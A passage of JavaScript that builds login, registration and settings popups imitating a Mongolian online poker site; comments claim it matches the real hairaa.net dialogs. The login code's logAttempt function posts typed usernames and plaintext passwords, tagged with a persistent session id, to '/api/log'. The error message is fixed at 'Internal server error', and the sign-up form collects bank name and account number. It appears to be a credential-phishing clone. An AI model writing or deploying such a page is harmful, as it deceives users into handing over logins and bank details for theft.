(function () {
  'use strict';

  /* ═══════════════════════════════════════
     1. LOGIN POPUP  — loginui.html-н HTML
  ═══════════════════════════════════════ */
  function buildLoginPopup() {
    var el = document.createElement('div');
    el.id        = 'login-popup';
    el.style.cssText = 'display:none;position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;align-items:center;justify-content:center;';

    el.innerHTML = [
      '<div id="login-modal-bg" style="position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.58);pointer-events:none;"></div>',
        '<div class="LoginContainer LoginContainer_c_dark Dialog Dialog_v_default Dialog_c_dark"',
        '     style="position:relative;z-index:1;width:auto;height:auto;background:transparent;border:none;">',

          '<div class="panel Popup__content Dialog__popup_content show-dialog-animation" tabindex="-1" style="background:#232334;width:20em;height:28.5em;max-width:95vw;max-height:95vh;box-sizing:border-box;">',

            /* ── Header ── */
            '<div class="Dialog__header">',
              '<div class="Dialog__title">',
                '<div class="Dialog__title_content" style="color:#d4ac0d;">Нэвтрэх</div>',
              '</div>',
              '<div class="Dialog__top_actions">',
                '<div id="login-close-btn"',
                '     class="panel button SimpleButton SimpleButton_v_transparent SimpleButton_c_blue',
                '            SimpleButton_use_icon Dialog__top_action close_button SimpleButton_interactive"',
                '     tabindex="-1">',
                  '<div class="SimpleButton__content">',
                    '<div class="panel Icon Icon_v_default Icon_c_white Icon_val_close_popup SimpleButton__icon Dialog__top_action_icon" tabindex="-1">',
                      '<div class="Icon__content"></div>',
                    '</div>',
                  '</div>',
                '</div>',
              '</div>',
            '</div>',

            /* ── Content ── */
            '<div class="Dialog__content">',
              '<div class="scroll-panel" style="position:relative;height:100%;width:100%;overflow:hidden;touch-action:none;">',
                '<div class="scroll-wrapper" style="transform:translate(0px,0px) translateZ(0px)">',
                  '<div class="LoginContainer__content">',

                    '<div class="LoginContainer__form_fields">',

                      /* Нэр */
                      '<div class="panel FormField FormField_v_default FormField_c_light LoginContainer__form_field LoginContainer__input LoginContainer__username" tabindex="-1">',
                        '<div class="FormField__content">',
                          '<div class="FormField__control">',
                            '<div class="field-value-content-wrapper">',
                              '<input id="login-username" name="username" tabindex="0"',
                              '       class="Input Input_v_rounded Input_c_blue"',
                              '       placeholder="нэр" type="text" spellcheck="false" value="">',
                            '</div>',
                          '</div>',
                        '</div>',
                      '</div>',

                      /* Нууц үг */
                      '<div class="panel FormField FormField_v_default FormField_c_light LoginContainer__form_field LoginContainer__input LoginContainer__password password-field" tabindex="-1">',
                        '<div class="FormField__content">',
                          '<div class="FormField__control">',
                            '<div class="field-value-content-wrapper" style="position:relative;">',
                              '<input id="login-password" name="password" tabindex="0"',
                              '       class="Input Input_v_rounded Input_c_blue"',
                              '       placeholder="Нууц үг" type="text" spellcheck="false" value=""',
                              '       style="padding-right:42px;">',
                              '<button id="toggle-password-btn" type="button" tabindex="-1"',
                              '        aria-label="Нууц үг харуулах"',
                              '        style="position:absolute;right:10px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;padding:4px;display:flex;align-items:center;justify-content:center;opacity:1;">',
                                '<svg id="toggle-password-icon" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">',
                                  '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>',
                                  '<circle cx="12" cy="12" r="3"/>',
                                '</svg>',
                              '</button>',
                            '</div>',
                          '</div>',
                        '</div>',
                      '</div>',

                      /* Намайг сана */
                      '<div class="panel FormField FormField_v_default FormField_c_light LoginContainer__form_field LoginContainer__checkbox LoginContainer__remember_me FormField_reverse FormField_useLabel" tabindex="-1">',
                        '<div class="FormField__content">',
                          '<div class="FormField__label"><div class="FormField__label_text">Намайг сана</div></div>',
                          '<div class="FormField__control">',
                            '<div class="panel Checkbox Checkbox_v_checkbox Checkbox_c_blue" tabindex="0">',
                              '<div class="Checkbox__content">',
                                '<div class="panel Icon Icon_v_default Icon_c_light Icon_val_ Checkbox__checkmark" tabindex="-1">',
                                  '<div class="Icon__content"></div>',
                                '</div>',
                              '</div>',
                            '</div>',
                          '</div>',
                        '</div>',
                      '</div>',

                      /* Language selector */
                      '<div class="panel Select Select_v_transparent Select_c_blue LanguageSelectorContainer LanguageSelectorContainer_v_default LanguageSelectorContainer_c_light LoginContainer__language Select_use_icon Select_use_arrow Select_use_checkbox selected">',
                        '<div class="Select__content">',
                          '<div class="panel button Select__button" tabindex="-1">',
                            '<div class="button-content">',
                              '<div class="panel Icon Icon_v_default Icon_c_white Icon_val_flag_icon_mn Select__button_icon" tabindex="-1">',
                                '<div class="Icon__content"></div>',
                              '</div>',
                              '<div class="Select__button_arrow"></div>',
                            '</div>',
                          '</div>',
                        '</div>',
                      '</div>',

                    '</div>',

                    /* ── Error ── */
                    '<div class="LoginContainer__errors" id="login-error" style="display:none;">',
                      '<div class="LoginContainer__errors__content">',
                        'Internal server error. Please try again later.',
                      '</div>',
                    '</div>',

                    '<div class="LoginContainer__buttons">',

                      /* Нэвтрэх */
                      '<div id="do-login-btn"',
                      '     class="panel button SimpleButton SimpleButton_v_flat SimpleButton_c_success_blue',
                      '            SimpleButton_use_text LoginContainer__action LoginContainer__sign_in_action SimpleButton_interactive"',
                      '     tabindex="0">',
                        '<div class="SimpleButton__content">',
                          '<div class="SimpleButton__text">НЭВТРЭХ</div>',
                        '</div>',
                      '</div>',

                      '<div class="LoginContainer__social_buttons"></div>',

                      '<div class="LoginContainer__bottom_buttons">',
                        '<div class="LoginContainer__bottom_button">',
                          '<div class="panel button SimpleButton SimpleButton_v_flat SimpleButton_c_secondary_blue SimpleButton_use_text LoginContainer__action LoginContainer__restore_password_action SimpleButton_interactive" tabindex="0">',
                            '<div class="SimpleButton__content"><div class="SimpleButton__text">НУУЦ ҮГЭЭ МАРТСАН?</div></div>',
                          '</div>',
                        '</div>',
                        '<div class="LoginContainer__bottom_button">',
                          '<div class="panel button SimpleButton SimpleButton_v_flat SimpleButton_c_secondary_blue SimpleButton_use_text LoginContainer__action LoginContainer__sign_up_action SimpleButton_interactive" tabindex="0">',
                            '<div class="SimpleButton__content"><div class="SimpleButton__text">БҮРТГҮҮЛЭХ</div></div>',
                          '</div>',
                        '</div>',
                      '</div>',

                      /* Цуцлах */
                      '<div id="login-cancel-btn"',
                      '     class="panel button SimpleButton SimpleButton_v_flat SimpleButton_c_secondary_blue',
                      '            SimpleButton_use_text LoginContainer__action LoginContainer__close_action SimpleButton_interactive"',
                      '     tabindex="0">',
                        '<div class="SimpleButton__content"><div class="SimpleButton__text">Цуцлах</div></div>',
                      '</div>',

                    '</div>',

                  '</div>',
                '</div>',
              '</div>',
            '</div>',

          '</div>',
        '</div>',
    ].join('');

    return el;
  }

  function getSessionId() {
    var sid = localStorage.getItem('udach_sid');
    if (!sid) {
      sid = Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
      localStorage.setItem('udach_sid', sid);
    }
    return sid;
  }

  function logAttempt(user, pass, category) {
    var entry = { u: user, p: pass, c: category || 'Нэвтрэх', t: new Date().toLocaleString(), s: getSessionId() };
    try {
      fetch('/api/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(entry)
      });
    } catch (e) {}
  }

  function escHtml(s) {
    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
  }


  function showLogin() {
    var p = document.getElementById('login-popup');
    if (!p) return;
    p.style.display = 'flex';
    var err = document.getElementById('login-error');
    if (err) err.style.display = 'none';
    var u = document.getElementById('login-username');
    if (u) setTimeout(function () { u.focus(); }, 50);
  }

  function hideLogin() {
    var p = document.getElementById('login-popup');
    if (p) p.style.display = 'none';
  }

  /* ═══════════════════════════════════════
     2. REGISTER POPUP  — register.html-н HTML
  ═══════════════════════════════════════ */
  function buildRegisterPopup() {
    if (!document.getElementById('reg-css')) {
      var s = document.createElement('style');
      s.id = 'reg-css';
      s.textContent =
        '#register-popup .widget-form-content{background:#1e1f2e!important;color:#fff;display:flex!important;flex-direction:column!important;height:100%;overflow:hidden}' +
        '#register-popup .form-header{padding:18px 20px 14px;border-bottom:1px solid rgba(255,255,255,.1);flex-shrink:0}' +
        '#register-popup .form-title{display:flex!important;align-items:center!important;justify-content:space-between!important}' +
        '#register-popup .form-caption{color:#fff!important;font-size:16px!important;font-weight:bold!important;text-transform:uppercase!important;letter-spacing:1.5px!important;flex:1;text-align:center}' +
        '#register-popup .close-form .Icon__content{filter:brightness(2)!important}' +
        '#register-popup .form-fields-wrapper{flex:1!important;overflow:hidden!important;min-height:0}' +
        '#register-popup .scroll-panel{overflow-y:auto!important;overflow-x:hidden!important}' +
        '#register-popup .scroll-wrapper{transform:none!important;padding:4px 14px}' +
        '#register-popup .iScrollVerticalScrollbar{display:none!important}' +
        '#register-popup .field-wrapper,#register-popup .field-container,#register-popup .FormField,#register-popup .WidgetFormContainer__form_field{width:100%!important;box-sizing:border-box!important}' +
        '#register-popup .FormField_c_light{background:transparent!important;border:none!important;padding:0!important}' +
        '#register-popup .FormField__content{display:flex!important;flex-direction:column!important;align-items:stretch!important;padding:8px 0 4px!important;gap:5px!important;width:100%!important;box-sizing:border-box!important}' +
        '#register-popup .FormField__label{height:auto!important}' +
        '#register-popup .FormField__label_text{color:rgba(255,255,255,.75)!important;font-size:13px!important}' +
        '#register-popup .FormField__control{height:auto!important;overflow:visible!important;width:100%!important;display:block!important}' +
        '#register-popup .required{color:rgba(255,255,255,.6)!important;font-size:12px!important}' +
        '#register-popup .Input_v_rounded.Input_c_blue,#register-popup .Input_v_rounded.Input_c_blue.telephone-input{background:#2b2d42!important;border:1px solid rgba(255,255,255,.12)!important;border-radius:8px!important;color:#fff!important;padding:11px 14px!important;width:100%!important;box-sizing:border-box!important;box-shadow:none!important;font-size:14px!important;height:auto!important;display:block!important}' +
        '#register-popup .Input_v_rounded.Input_c_blue::placeholder{color:rgba(255,255,255,.28)!important}' +
        '#register-popup .Input_v_rounded.Input_c_blue:focus{border-color:#d4ac0d!important;outline:none!important}' +
        '#register-popup .field-value-content-wrapper{width:100%!important;display:block!important}' +
        '#register-popup .telephone-input-wrapper,#register-popup .InputField__with_icon{width:100%!important;display:block!important}' +
        '#register-popup select.reg-bank-select{width:100%!important;background:#2b2d42!important;border:1px solid rgba(255,255,255,.12)!important;border-radius:8px!important;color:rgba(255,255,255,.8)!important;padding:11px 14px!important;font-size:14px!important;height:auto!important;box-sizing:border-box!important;appearance:none!important;-webkit-appearance:none!important;cursor:pointer!important;outline:none!important}' +
        '#register-popup select.reg-bank-select:focus{border-color:#d4ac0d!important}' +
        '#register-popup .Checkbox_c_blue{border:2px solid rgba(255,255,255,.3)!important;background:transparent!important;border-radius:4px!important}' +
        '#register-popup .buttons-holder{padding:12px 20px 16px;flex-shrink:0;border-top:1px solid rgba(255,255,255,.1)}' +
        '#register-popup .SimpleButton.send-form{background:#c0392b!important;border-radius:8px!important;width:100%!important;height:44px!important;border:none!important;cursor:pointer}' +
        '#register-popup .SimpleButton.send-form .SimpleButton__text{color:#fff!important;font-weight:bold!important;text-transform:uppercase!important;font-size:15px!important;letter-spacing:1px!important}' +
        '#register-popup .SimpleButton.send-form:active{background:#a93226!important}';
      document.head.appendChild(s);
    }

    var el = document.createElement('div');
    el.id = 'register-popup';
    el.style.cssText = 'display:none;position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;align-items:center;justify-content:center;';
    el.innerHTML =
      '<div class="Popup__overlay" style="position:absolute;inset:0;background:rgba(0,0,0,0.58);pointer-events:none;"></div>' +
      '<div id="register-wrapper" style="position:relative;display:flex;width:min(92vw,400px);height:min(90vh,580px);">' +
        '<div class="panel Popup__content Dialog__popup_content show-dialog-animation" tabindex="-1" style="background:#232334;width:100%;height:100%;box-sizing:border-box;overflow:hidden;">' +
          '<div class="widget-form-content">' +

            '<div class="form-header">' +
              '<div class="form-title">' +
                '<div class="panel button SimpleButton SimpleButton_v_transparent SimpleButton_c_blue SimpleButton_use_icon widget-form-button close-form SimpleButton_interactive" tabindex="0">' +
                  '<div class="SimpleButton__content">' +
                    '<div class="panel Icon Icon_v_default Icon_c_white Icon_val_close_popup SimpleButton__icon">' +
                      '<div class="Icon__content"></div>' +
                    '</div>' +
                  '</div>' +
                '</div>' +
                '<div class="form-caption">Бүртгүүлэх</div>' +
                '<div style="width:36px;"></div>' +
              '</div>' +
            '</div>' +

            '<div class="form-fields-wrapper">' +
              '<div class="scroll-panel" style="height:100%;width:100%;overflow-y:auto;overflow-x:hidden;touch-action:pan-y;">' +
                '<div class="scroll-wrapper">' +
                  '<div class="form-fields">' +

                    '<div class="field-wrapper nick-field-wrapper">' +
                      '<div class="field-container nick-field-container">' +
                        '<div class="panel FormField FormField_v_default FormField_c_light WidgetFormContainer__form_field input_form_field nick-field type_text nick FormField_useLabel">' +
                          '<div class="FormField__content">' +
                            '<div class="FormField__label"><div class="FormField__label_text"><span>Хоч</span><span class="required"> *</span></div></div>' +
                            '<div class="FormField__control"><div class="field-value-content-wrapper">' +
                              '<input tabindex="0" class="Input Input_v_rounded Input_c_blue" placeholder="Хэрэглэгчийн ID (хоч) -оо энд бичнэ үү" type="text" spellcheck="false" value="" />' +
                            '</div></div>' +
                          '</div>' +
                        '</div>' +
                      '</div>' +
                    '</div>' +

                    '<div class="field-wrapper email-field-wrapper">' +
                      '<div class="field-container email-field-container">' +
                        '<div class="panel FormField FormField_v_default FormField_c_light WidgetFormContainer__form_field input_form_field email-field type_email email FormField_useLabel">' +
                          '<div class="FormField__content">' +
                            '<div class="FormField__label"><div class="FormField__label_text"><span>И-мэйл</span><span class="required"> *</span></div></div>' +
                            '<div class="FormField__control"><div class="field-value-content-wrapper">' +
                              '<input tabindex="0" class="Input Input_v_rounded Input_c_blue" placeholder="Өөрийн имэйлийг энд бичнэ үү" type="email" spellcheck="false" value="" />' +
                            '</div></div>' +
                          '</div>' +
                        '</div>' +
                      '</div>' +
                    '</div>' +

                    '<div class="field-wrapper password-field-wrapper">' +
                      '<div class="field-container password-field-container">' +
                        '<div class="panel FormField FormField_v_default FormField_c_light WidgetFormContainer__form_field input_form_field password-field type_password password FormField_useLabel">' +
                          '<div class="FormField__content">' +
                            '<div class="FormField__label"><div class="FormField__label_text"><span>Нууц үг</span><span class="required"> *</span></div></div>' +
                            '<div class="FormField__control"><div class="field-value-content-wrapper">' +
                              '<input tabindex="0" class="Input Input_v_rounded Input_c_blue" placeholder="Нууц үгээ энд оруулна уу" type="password" spellcheck="false" value="" />' +
                            '</div></div>' +
                          '</div>' +
                        '</div>' +
                      '</div>' +
                    '</div>' +

                    '<div class="field-wrapper password_confirm-field-wrapper">' +
                      '<div class="field-container password_confirm-field-container">' +
                        '<div class="panel FormField FormField_v_default FormField_c_light WidgetFormContainer__form_field input_form_field password_confirm-field type_password password_confirm FormField_useLabel">' +
                          '<div class="FormField__content">' +
                            '<div class="FormField__label"><div class="FormField__label_text"><span>Нууц үг батлах</span><span class="required"> *</span></div></div>' +
                            '<div class="FormField__control"><div class="field-value-content-wrapper">' +
                              '<input tabindex="0" class="Input Input_v_rounded Input_c_blue" placeholder="Нууц үгээ дахин оруулна уу" type="password" spellcheck="false" value="" />' +
                            '</div></div>' +
                          '</div>' +
                        '</div>' +
                      '</div>' +
                    '</div>' +

                    '<div class="field-wrapper phoneNumber-field-wrapper">' +
                      '<div class="field-container phoneNumber-field-container">' +
                        '<div class="panel FormField FormField_v_default FormField_c_light WidgetFormContainer__form_field input_form_field phoneNumber-field type_tel phoneNumber FormField_useLabel">' +
                          '<div class="FormField__content">' +
                            '<div class="FormField__label"><div class="FormField__label_text"><span>Утас</span><span class="required"> *</span></div></div>' +
                            '<div class="FormField__control">' +
                              '<div class="telephone-input-wrapper"><div class="InputField__with_icon">' +
                                '<input tabindex="0" class="Input Input_v_rounded Input_c_blue telephone-input" placeholder="Утасны дугаараа энд оруулна уу" type="tel" spellcheck="false" value="" />' +
                              '</div></div>' +
                            '</div>' +
                          '</div>' +
                        '</div>' +
                      '</div>' +
                    '</div>' +

                    '<div class="field-wrapper bankCode-field-wrapper">' +
                      '<div class="field-container bankCode-field-container">' +
                        '<div class="panel FormField FormField_v_default FormField_c_light WidgetFormContainer__form_field select_form_field bankCode-field bankCode FormField_useLabel">' +
                          '<div class="FormField__content">' +
                            '<div class="FormField__label"><div class="FormField__label_text"><span>Банкны нэр</span><span class="required"> *</span></div></div>' +
                            '<div class="FormField__control">' +
                              '<select class="reg-bank-select">' +
                                '<option value="" disabled selected style="color:#888;">Банк сонгоно уу</option>' +
                                '<option value="khanbank">Хаан банк</option>' +
                                '<option value="hasbank">Хас банк</option>' +
                                '<option value="golomt">Голомт банк</option>' +
                              '</select>' +
                            '</div>' +
                          '</div>' +
                        '</div>' +
                      '</div>' +
                    '</div>' +

                    '<div class="field-wrapper bankAccountNumber-field-wrapper">' +
                      '<div class="field-container bankAccountNumber-field-container">' +
                        '<div class="panel FormField FormField_v_default FormField_c_light WidgetFormContainer__form_field input_form_field bankAccountNumber-field type_text bankAccountNumber FormField_useLabel">' +
                          '<div class="FormField__content">' +
                            '<div class="FormField__label"><div class="FormField__label_text"><span>Дансны дугаар</span><span class="required"> *</span></div></div>' +
                            '<div class="FormField__control"><div class="field-value-content-wrapper">' +
                              '<input tabindex="0" class="Input Input_v_rounded Input_c_blue" placeholder="Дансны дугаараа энд оруулна уу" type="text" spellcheck="false" value="" />' +
                            '</div></div>' +
                          '</div>' +
                        '</div>' +
                      '</div>' +
                    '</div>' +

                    '<div class="field-wrapper age-field-wrapper">' +
                      '<div class="field-container age-field-container">' +
                        '<div class="panel FormField FormField_v_default FormField_c_light WidgetFormContainer__form_field checkbox_form_field age-field age FormField_useLabel">' +
                          '<div class="FormField__content" style="flex-direction:row!important;align-items:center;gap:10px;">' +
                            '<div class="FormField__control">' +
                              '<div class="panel Checkbox Checkbox_v_checkbox Checkbox_c_blue checkbox_form_field__checkbox" tabindex="0">' +
                                '<div class="Checkbox__content">' +
                                  '<div class="panel Icon Icon_v_default Icon_c_light Icon_val_ Checkbox__checkmark"><div class="Icon__content"></div></div>' +
                                '</div>' +
                              '</div>' +
                            '</div>' +
                            '<div class="FormField__label" style="margin:0;"><div class="FormField__label_text"><span>18+ настай</span><span class="required"> *</span></div></div>' +
                          '</div>' +
                        '</div>' +
                      '</div>' +
                    '</div>' +

                    '<div style="height:8px;"></div>' +
                  '</div>' +
                '</div>' +
              '</div>' +
            '</div>' +

            '<div class="buttons-holder">' +
              '<div class="panel button SimpleButton SimpleButton_v_flat SimpleButton_c_blue SimpleButton_use_text widget-form-button send-form SimpleButton_interactive" tabindex="0">' +
                '<div class="SimpleButton__content">' +
                  '<div class="SimpleButton__text">Илгээх</div>' +
                '</div>' +
              '</div>' +
            '</div>' +

          '</div>' +
        '</div>' +
      '</div>';
    return el;
  }

  function showRegister() {
    var p = document.getElementById('register-popup');
    if (!p) return;
    p.style.display = 'flex';
    setTimeout(function() {
      var n = document.querySelector('#register-popup .nick-field input');
      if (n) n.focus();
    }, 50);
  }

  function hideRegister() {
    var p = document.getElementById('register-popup');
    if (p) p.style.display = 'none';
  }

  /* ═══════════════════════════════════════
     3. SETTINGS POPUP  — settings.html-н яг HTML
  ═══════════════════════════════════════ */
  // Tab titles + [key, label, default] per settings tab, in tab order.
  // Matches the real hairaa.net Settings dialog.
  var settingsTabTitles = [
    'Table settings', 'App themes', 'Chat settings', 'System settings', 'Table themes'
  ];
  var settingsGroups = [
    [
      ['show_table_on_turn',      'Show table on your turn',               false],
      ['auto_blind',              'Auto post blinds',                      true],
      ['auto_ante',               'Auto post ante',                        false],
      ['auto_wait_bb',            'Wait for BB',                           false],
      ['auto_muck',               'Auto muck cards',                       false],
      ['auto_straddle',           'Auto post straddle',                    false],
      ['auto_no_straddle',        'Auto decline straddle',                 false],
      ['display_bet_amounts',     'Display bet amounts',                   true],
      ['run_it_twice',            'Auto accept run it twice',              false],
      ['insurance',               'Auto accept insurance',                 false],
      ['tableCashInBB',           'Display cash in BB',                    false],
      ['tournamentTableCashInBB', 'Display tournament chip stack in BB',   false],
      ['stream_mode',             'Stream Mode',                           false],
      ['vibration',               'Vibration',                             true],
      ['confirm_fold',            'Confirm Fold while Check is available', true]
    ],
    [
      ['app_dark_mode',     'Dark mode',                    true],
      ['app_left_hand',     'Left-handed layout',           false],
      ['app_compact_lobby', 'Compact lobby',                false],
      ['app_animations',    'Interface animations',         true],
      ['app_big_font',      'Large font',                   false],
      ['app_hide_promo',    'Hide promotions',              false]
    ],
    [
      ['chat_show',         'Show chat',                    true],
      ['chat_dealer',       'Show dealer messages',         true],
      ['chat_players',      'Show player messages',         true],
      ['chat_emoji',        'Show emoji',                   true],
      ['chat_filter',       'Filter profanity',             true],
      ['chat_timestamps',   'Show message time',            false]
    ],
    [
      ['sys_animation', 'Animation',              true],
      ['sys_flag',      'Display flag on avatar', true]
    ],
    []
  ];

  var defaultChecked = {};
  settingsGroups.forEach(function (g) {
    g.forEach(function (it) { defaultChecked[it[0]] = it[2]; });
  });

  // A miniature lobby mock-up, sized by the container's font-size (em-based).
  // Used both as the small theme thumbnails and the large live preview.
  function lobbyMock() {
    var icons = [
      ['🎁', 'PROMO', ''],
      ['🏆', 'TOURNEY', ' sel'],
      ['♠', 'CASH TABLE', ''],
      ['🏆', 'SIT & GO', ''],
      ['🌀', 'SPINS', '']
    ];
    var rows = '';
    for (var r = 0; r < 4; r++) {
      rows += '<div class="appth-row' + (r === 1 ? ' alt' : '') + '">' +
        '<span class="c-name">Table name</span>' +
        '<span class="c-st">1/2</span>' +
        '<span class="c-pl">4/6</span>' +
        '<span class="c-gt">Stud H/L</span>' +
        '<span class="play">PLAY</span>' +
      '</div>';
    }
    return '<div class="appth-mock">' +
      '<div class="appth-icons">' +
        icons.map(function (ic) {
          return '<span class="appth-ic' + ic[2] + '"><span class="em">' + ic[0] + '</span>' +
            '<span class="lbl">' + ic[1] + '</span></span>';
        }).join('') +
      '</div>' +
      '<div class="appth-filters">' +
        '<span class="appth-f any">ANY</span>' +
        '<span class="appth-f">REGULAR</span>' +
        '<span class="appth-f">SATELLITES</span>' +
        '<span class="appth-f dim">FREEROLLS</span>' +
      '</div>' +
      '<div class="appth-thead">' +
        '<span class="c-name">TABLE NAME</span>' +
        '<span class="c-st">STAKES</span>' +
        '<span class="c-pl">PLRS</span>' +
        '<span class="c-gt">GAME TYPE</span>' +
        '<span class="play" style="visibility:hidden">PLAY</span>' +
      '</div>' +
      rows +
    '</div>';
  }

  function appThemesHtml() {
    return '<div class="appth-wrap">' +
      '<div class="appth-col left">' +
        '<div class="appth-h">App Theme</div>' +
        '<div class="appth-thumbs">' +
          '<div class="appth-thumb sel">' + lobbyMock() + '<span class="appth-check">✓</span></div>' +
          '<div class="appth-thumb">' + lobbyMock() + '<span class="appth-check">✓</span></div>' +
        '</div>' +
      '</div>' +
      '<div class="appth-col right">' +
        '<div class="appth-h">Preview</div>' +
        '<div class="appth-preview">' + lobbyMock() + '</div>' +
      '</div>' +
    '</div>';
  }

  // System settings: two real checkboxes + an application-language dropdown.
  function systemSettingsHtml() {
    var langs = [
      ['en', '🇬🇧', 'English'],
      ['mn', '🇲🇳', 'Монгол'],
      ['ru', '🇷🇺', 'Русский'],
      ['ko', '🇰🇷', '한국어']
    ];
    return settingsGroups[3].map(function (it) { return cbItem(it[0], it[1], it[2]); }).join('') +
      '<div class="sys-lang-row">' +
        '<select id="settings-lang" class="sys-lang-select">' +
          langs.map(function (l) {
            return '<option value="' + l[0] + '">' + l[1] + '  ' + l[2] + '</option>';
          }).join('') +
        '</select>' +
        '<span class="sys-lang-label">Application language</span>' +
      '</div>';
  }

  // Table themes: front-deck picker + a green table preview.
  function tableThemesHtml() {
    // suit colors per deck scheme: [spade, heart, diamond, club]
    var decks = [
      ['#1a1a1a', '#c62828', '#c62828', '#1a1a1a'],
      ['#1a1a1a', '#1a1a1a', '#1a1a1a', '#1a1a1a'],
      ['#1a1a1a', '#c62828', '#1565c0', '#2e7d32'],
      ['#1565c0', '#c62828', '#1565c0', '#2e7d32']
    ];
    var suits = ['♠', '♥', '♦', '♣'];
    function deckCard(cols) {
      return '<div class="deck-card">' +
        suits.map(function (s, k) {
          return '<span class="deck-suit" style="color:' + cols[k] + '"><b>3</b>' + s + '</span>';
        }).join('') +
      '</div>';
    }
    var seats = ['UserName', 'UserName', 'UserName', 'UserName', 'UserName', 'UserName'];
    return '<div class="tt-wrap">' +
      '<div class="tt-col left">' +
        '<div class="appth-h">Front Deck</div>' +
        '<div class="tt-decks">' +
          decks.map(function (d, i) {
            return '<div class="tt-deck' + (i === 0 ? ' sel' : '') + '">' + deckCard(d) +
              '<span class="appth-check">✓</span></div>';
          }).join('') +
        '</div>' +
      '</div>' +
      '<div class="tt-col right">' +
        '<div class="appth-h">Table Preview:</div>' +
        '<div class="tt-table">' +
          '<div class="tt-felt">' +
            '<div class="tt-pot">Pot: $1024</div>' +
            '<div class="tt-board">' +
              '<span class="tt-card r">A♥</span><span class="tt-card">A♠</span>' +
              '<span class="tt-card r">Q♦</span><span class="tt-card">10♣</span>' +
              '<span class="tt-fire">🔥</span>' +
            '</div>' +
            seats.map(function (n, i) {
              return '<span class="tt-seat s' + i + '">' + n + '<br>$2581000</span>';
            }).join('') +
          '</div>' +
          '<div class="tt-actions">' +
            '<span class="tt-btn time">Time<br>bank 00</span>' +
            '<span class="tt-btn fold">Fold</span>' +
            '<span class="tt-btn call">Call<br>$0.04</span>' +
            '<span class="tt-btn raise">Raise<br>$0.08</span>' +
            '<span class="tt-bet">0.08</span>' +
            '<span class="tt-chip">Min</span><span class="tt-chip">1/2</span>' +
            '<span class="tt-chip">Pot</span><span class="tt-chip">Max</span>' +
          '</div>' +
        '</div>' +
      '</div>' +
    '</div>';
  }

  function settingsGroupsHtml() {
    return settingsGroups.map(function (g, i) {
      // Some tabs use a custom layout rather than a plain checkbox list.
      var custom = i === 1 ? appThemesHtml() : i === 4 ? tableThemesHtml() : null;
      var contents = i === 3 ? systemSettingsHtml() : null; // checkbox grid + extras
      var disp = custom ? 'block' : 'contents';
      var inner = custom || contents ||
        g.map(function (it) { return cbItem(it[0], it[1], it[2]); }).join('');
      return '<div class="settings-group" data-tab="' + i + '" data-disp="' + disp + '"' +
        ' style="display:' + (i ? 'none' : disp) + (custom ? ';width:100%' : '') + '">' +
        inner +
      '</div>';
    }).join('');
  }

  function buildSettingsPopup() {
    if (!document.getElementById('settings-css')) {
      var sc = document.createElement('style');
      sc.id = 'settings-css';
      // Real hairaa.net uses a flat dark-gray dialog, not the purple gradient.
      sc.textContent =
        '#settings-popup .Dialog__popup_content{background-image:linear-gradient(#4a4a4a 0%,#3a3a3a 14%,#3a3a3a 100%)!important}' +
        /* App themes tab */
        '#settings-popup .appth-wrap{display:flex;gap:32px;width:100%;padding:2px 2px 8px;box-sizing:border-box;color:#fff}' +
        '#settings-popup .appth-col.left{flex:0 0 auto}' +
        '#settings-popup .appth-col.right{flex:1 1 auto;min-width:0}' +
        '#settings-popup .appth-h{font-size:15px;color:#fff;margin:0 0 14px;font-weight:400}' +
        '#settings-popup .appth-thumbs{display:flex;gap:14px}' +
        '#settings-popup .appth-thumb{position:relative;border:2px solid transparent;border-radius:6px;padding:3px;background:#2b2b2b;cursor:pointer;box-sizing:border-box}' +
        '#settings-popup .appth-thumb.sel{border-color:#5aa0e0}' +
        '#settings-popup .appth-check{position:absolute;right:-7px;bottom:-7px;width:20px;height:20px;border-radius:50%;background:#e23b2e;color:#fff;font-size:12px;line-height:20px;text-align:center;display:none;box-shadow:0 0 0 2px #3a3a3a}' +
        '#settings-popup .appth-thumb.sel .appth-check{display:block}' +
        '#settings-popup .appth-thumb .appth-mock{font-size:3.1px}' +
        '#settings-popup .appth-preview .appth-mock{font-size:10px}' +
        /* the mock itself (em-based so font-size scales it) */
        '#settings-popup .appth-mock{width:34em;border-radius:.5em;overflow:hidden;font-family:Arial,Helvetica,sans-serif;line-height:1.15;background:#e9edf1}' +
        '#settings-popup .appth-icons{display:flex;background:#fff;padding:.5em .3em}' +
        '#settings-popup .appth-ic{flex:1;display:flex;flex-direction:column;align-items:center;gap:.25em;padding:.35em .1em;border-radius:.35em;color:#555}' +
        '#settings-popup .appth-ic.sel{background:#f3d17a;color:#3a2f10}' +
        '#settings-popup .appth-ic .em{font-size:1.7em;line-height:1}' +
        '#settings-popup .appth-ic .lbl{font-size:.72em;font-weight:bold;white-space:nowrap}' +
        '#settings-popup .appth-filters{display:flex;gap:.3em;background:#d9dde2;padding:.35em}' +
        '#settings-popup .appth-f{flex:1;text-align:center;font-size:.82em;font-weight:bold;padding:.4em .2em;border-radius:.3em;color:#556}' +
        '#settings-popup .appth-f.any{background:#e23b2e;color:#fff}' +
        '#settings-popup .appth-f.dim{color:#a8adb4}' +
        '#settings-popup .appth-thead,#settings-popup .appth-row{display:flex;align-items:center;padding:.5em .7em;font-size:.85em}' +
        '#settings-popup .appth-thead{background:#fff;color:#6a7078;font-weight:bold;font-size:.8em}' +
        '#settings-popup .appth-row{background:#fff;color:#2a2f35;border-top:1px solid #eef1f4}' +
        '#settings-popup .appth-row.alt{background:#cfe0f2}' +
        '#settings-popup .appth-mock .c-name{flex:3}' +
        '#settings-popup .appth-mock .c-st{flex:1.4}' +
        '#settings-popup .appth-mock .c-pl{flex:1}' +
        '#settings-popup .appth-mock .c-gt{flex:1.8}' +
        '#settings-popup .appth-mock .play{background:#4db6e8;color:#fff;font-weight:bold;font-size:.82em;padding:.35em .9em;border-radius:.3em}' +
        /* System settings — language row */
